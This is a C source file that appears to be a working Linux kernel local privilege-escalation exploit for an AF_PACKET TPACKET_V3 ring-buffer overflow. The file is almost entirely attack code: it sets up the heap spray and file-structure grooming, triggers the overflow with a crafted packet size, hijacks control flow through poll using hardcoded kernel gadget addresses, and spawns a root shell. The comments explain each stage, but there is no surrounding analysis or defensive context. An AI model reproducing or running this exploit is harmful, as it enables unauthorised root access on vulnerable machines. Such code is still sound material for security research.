#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <memory.h>
#include <unistd.h>
#include <sched.h>
#include <assert.h>

#include <sys/ioctl.h>
#include <sys/klog.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>

#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <netinet/if_ether.h>
#include <net/if.h>
#include <keyutils.h>
#include <pthread.h>
#include <poll.h>
#include <linux/kcmp.h>
#include "libexp.h"

#define CRASH_IP 0xffffffff8185a169
#define UADDR 0x4000000

/******************************************************************/
/*************************AUTO GENERATED***************************/
#define _GNU_SOURCE
#ifndef va_start
#include <stdarg.h>
#endif
#ifndef assert
#include <assert.h>
#endif
#ifndef signal
#include <signal.h>
#endif
#ifndef sched_setaffinity
#include <sched.h>
#endif

// we need this because rcx may not be restored in the trampoline
// so it will crash during kernel-user switch
void get_shell(int signum) {
    printf("uid: %d\n", getuid());
    system("/bin/sh");
    while(1);
}

void __attribute__((constructor)) _ret2reg_init() {
    signal(SIGSEGV, get_shell);
    signal(SIGTRAP, get_shell);
}

unsigned long _args[6];
unsigned long _arg_num = 0;
void __trigger()
{
        *(u64*)0x30004 = 0xffffffff81000be9;
        *(u64*)0x3000c = 0xffffffff8244ab00;
        *(u64*)0x30014 = 0xffffffff810d0ad0;
        *(u64*)0x3001c = 0xffffffff81021c3c;
        *(u64*)0x3006c = 0xffffffff814b8f7e;

    __asm__(".intel_syntax noprefix;"
            "push rbp;"

            "mov rcx, %0;"
            "mov rdi, [rcx+8*0];"
            "mov rsi, [rcx+8*1];"
            "mov rdx, [rcx+8*2];"
            "mov r10, [rcx+8*3];"
            "mov r8, [rcx+8*4];"
            "mov r9, [rcx+8*5];"

                        "mov r12, 0xffffffff813a8a49;"
                        "mov r10, 0xffffffff81c00162;"

            "mov rax, 7;"
            "syscall;"
            "pop rbp;"
            ".att_syntax;"
            : : "r"(_args));
}

void _trigger(int num_args, ...)
{
    va_list ap;
    va_start(ap, num_args);
    for(int i=0; i<num_args; i++) {
        _args[_arg_num++] = va_arg(ap, unsigned long);
    }
    va_arg(ap, unsigned long);
    va_end(ap);

    __asm__(".intel_syntax noprefix;"
            "call __trigger;"
            ".att_syntax;");
    _arg_num = 0;
    if(getuid() == 0) get_shell(0);
}

#define NUMARGS(...)  (sizeof((unsigned long[]){__VA_ARGS__})/sizeof(unsigned long))
#define ret2reg_trigger(...) _trigger(NUMARGS(__VA_ARGS__), __VA_ARGS__ )
/*************************AUTO GENERATED***************************/
/******************************************************************/

// packet_sock->xmit
#define XMIT_OFFSET	1296
#define __ALIGN_KERNEL_MASK(x, mask)	(((x) + (mask)) & ~(mask))
#define __ALIGN_KERNEL(x, a)		__ALIGN_KERNEL_MASK(x, (typeof(x))(a) - 1)
#define ALIGN(x, a)			__ALIGN_KERNEL((x), (a))
#define V3_ALIGNMENT	(8)
#define BLK_HDR_LEN	(ALIGN(sizeof(struct tpacket_block_desc), V3_ALIGNMENT))
#define ETH_HDR_LEN	sizeof(struct ethhdr)

int sock_fd;
unsigned int sizeof_priv;
char payload[0x100];
struct pollfd *pfds;

struct file {
	char hole1[0x28];
	void *f_op;
	char hole2[0x14];
	unsigned int f_mode;
	char hole3[0xb8];
};

struct file_operations {
	char hole1[0x8];
	void* llseek;
	void* read;
	char hole2[0xd8];
};

struct kernel_param {
	char hole1[0x10];
	void *ops;
	char hole2[0x8];
	void *arg;
};

struct kernel_param_ops {
	char hole1[0x10];
	uint64_t rdx; // void* get
	void* free;
};

struct fetch_param {
	void* fn;
	char hole1[0x8];
};

struct deref_fetch_param {
	struct fetch_param orig;
	char hole1[0x18];
};

struct irqaction {
	void* handle;
	void* dev_id;
	char hole[0x70];
};

struct irq_desc {
	char hole1[0x68];
	struct irqaction* action;
	char hole2[0x110];
};

int fd[0x1000];
struct file fake_file;

void init_packet_socket_rx_ring(int s, unsigned int block_size,
		unsigned int frame_size, unsigned int block_nr,
		unsigned int sizeof_priv, unsigned int timeout) {
	// specify using TPACKET_V3 version cause this vulnerability
	// only impacts this verison
	int v = TPACKET_V3;
	int rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &v, sizeof(v));
	if (rv < 0) {
		perror("[-] setsockopt(PACKET_VERSION)");
		exit(EXIT_FAILURE);
	}

	struct tpacket_req3 req;
	memset(&req, 0, sizeof(req));
	req.tp_block_size = block_size;
	req.tp_frame_size = frame_size;
	req.tp_block_nr = block_nr;
	req.tp_frame_nr = (block_size * block_nr) / frame_size;
	req.tp_retire_blk_tov = timeout;
	req.tp_sizeof_priv = sizeof_priv;
	req.tp_feature_req_word = 0;
	
	// vulnerability happens in this system call
	rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));
	if (rv < 0) {
		perror("[-] setsockopt(PACKET_RX_RING)");
		exit(EXIT_FAILURE);
	}
}

int setup_packet_socket_buffer(unsigned int block_size, unsigned int frame_size,
		unsigned int block_nr, unsigned int sizeof_priv, int timeout) {
	// create a AF_PACKET socket
	int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (s < 0) {
		perror("[-] socket(AF_PACKET)");
		exit(EXIT_FAILURE);
	}

	init_packet_socket_rx_ring(s, block_size, frame_size, block_nr,
		sizeof_priv, timeout);

	struct sockaddr_ll sa;
	memset(&sa, 0, sizeof(sa));
	sa.sll_family = PF_PACKET;
	sa.sll_protocol = htons(ETH_P_ALL);
	sa.sll_ifindex = if_nametoindex("lo");
	sa.sll_hatype = 0;
	sa.sll_pkttype = 0;
	sa.sll_halen = 0;

	int rv = bind(s, (struct sockaddr *)&sa, sizeof(sa));
	if (rv < 0) {
		perror("[-] bind(AF_PACKET)");
		exit(EXIT_FAILURE);
	}

	return s;
}

void send_packet(int s, char *buffer, int size) {
	struct sockaddr_ll sa;
	memset(&sa, 0, sizeof(sa));
	sa.sll_ifindex = if_nametoindex("lo");
	sa.sll_halen = ETH_ALEN;

	if (sendto(s, buffer, size, 0, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
		perror("[-] sendto(SOCK_RAW)");
		exit(EXIT_FAILURE);
	}
}

int kmalloc_file(int num) {
	int i = 0;
	char filename[20];
	for (i = 0; i < num; i++) {
		sprintf(filename, "test%d", i);
		fd[i] = open(filename, O_WRONLY | O_CREAT);
		if (unlikely(fd[i] < 0)) {
			perror("alloc_file\n");
			return -1;
		}
	}
	return 0;
}

int hijack_poll(void* kaddr) {
	int i = 0;
	// overflow will occupy some bytes of the file object
	// right before victim file object which makes it 
	// fragile. Therefore, we poll inversely
	printf("trying to hijack control flow\n");
	for (i = 127; i >= 0; i--) {
		pfds[0].fd = fd[i];
		// poll(pfds, 30, 0);
		ret2reg_trigger(pfds, 30, 0);
		// poll(fd[i], 0, SEEK_SET);
	}
	return 0;
}

int kmalloc_packet_sock(){
	int s = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
	if (s == -1) {
		perror("[-] socket(SOCK_DGRAM)");
		exit(EXIT_FAILURE);
	}
	return s;
}

void context_setup(void)
{
	setup_sandbox();

	// bring up lo interface
	int fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
	struct ifreq req;
	memset(&req, 0, sizeof(req));
	strcpy(req.ifr_name, "lo");
	req.ifr_flags = IFF_UP|IFF_LOOPBACK|IFF_RUNNING;
	int ret = ioctl(fd, SIOCSIFFLAGS, &req);
	if(ret != 0) error_out("[setup_pg_vec] ioctl");
	close(fd);

	sock_fd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
	if (sock_fd == -1) {
		perror("[-] socket(SOCK_RAW)");
		exit(EXIT_FAILURE);
	}
}

u64 _get_mem_size(void)
{
	FILE *f = fopen("/proc/meminfo", "r");
	char *line_buf = NULL;
	char *buf;
	size_t n;

	assert(f != NULL);

	if(getline(&line_buf, &n, f) < 0) {
		free(line_buf);
		goto out;
	}
	buf = strstr(line_buf, ":") + 1;
	fclose(f);
	return atoll(buf) * 1024;

out:
	puts("fail to read memory size");
	fclose(f);
	return -1;
}

void payload_setup(void) {
	pfds = umem_alloc(0x30000, 0x1000);
	pfds[0].fd = 0; // actually allocate the page

	int offset = 0x110;
	unsigned int maclen = ETH_HDR_LEN;
	unsigned int netoff = TPACKET_ALIGN(TPACKET3_HDRLEN +
				(maclen < 16 ? 16 : maclen));
	// macoff = 0x52 get added in tpacket_rcv() -> skb_copy_bits()
	unsigned int macoff = netoff - maclen;

	// BLK_HDR_LEN = 48 is the length of tpacket_block_desc
	// which is at the beginning of block
	sizeof_priv = (1u<<31) + (1u<<30) +
		0x1000 - BLK_HDR_LEN - macoff + offset; // 0xc0008c56

	void *uaddr = umem_alloc((void *)UADDR, 0x1000);
	// ((struct file_operations *)uaddr)->llseek = (void *)CRASH_IP;
	((u64 *)uaddr)[0x40/8] = CRASH_IP;

	u64 upper_limit = _get_mem_size() & (~0xfff);
	u64 kaddr = 0xffff880000000000 + upper_limit/4*3;
	kaddr &= 0xfffffffffffff000;
	printf("kaddr: %#llx\n", kaddr);

	memset(payload, 'A', sizeof(payload));
	*(long *)&payload[0x16] = kaddr;

	for(int i=0;i<upper_limit/0x1000/4;i++) {
		void *addr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_POPULATE, -1, 0); 
		memcpy(addr, uaddr, sizeof(struct file_operations));
	}
}

int main()
{
	context_setup();
	payload_setup();

	/* 
	 *  drain the page allocator freelists and
	 *  cause some high-order page block to be splited
	 *  create a packet socket and attach a ring buffer with 0x1000
	 *  blocks of size 0x1000 and frame size as 0x200
	 */
	setup_packet_socket_buffer(0x1000, 0x200, 0x1000, 0, 100);

	/*
	 *  create 512 keys to exhaust kmalloc-256 cache which uses 0x4000 slabs
	 */
	defragment(0x100, 0x200);

	/* 
	 *  create a packet socket and attach a ring buffer 
	 *  with 2 blocks of size 0x8000 and frame size as 2048
	 *  the second block is used to overflow
	 */

	setup_packet_socket_buffer(0x1000, 0x200, 2, sizeof_priv, 100);
	/*
	 *  open files to allocate file structures and 
	 *  cause allocation of at least one new slab which is right after 
	 *  the second block
	 */
	// nonsense();
	kmalloc_file(0x200);

	/*
	 * cause overflow 
	 */
	send_packet(sock_fd, payload, 0x20);

	/*
	 * hijack control flow
	 */

	hijack_poll((void *)UADDR);

	return 0;
}
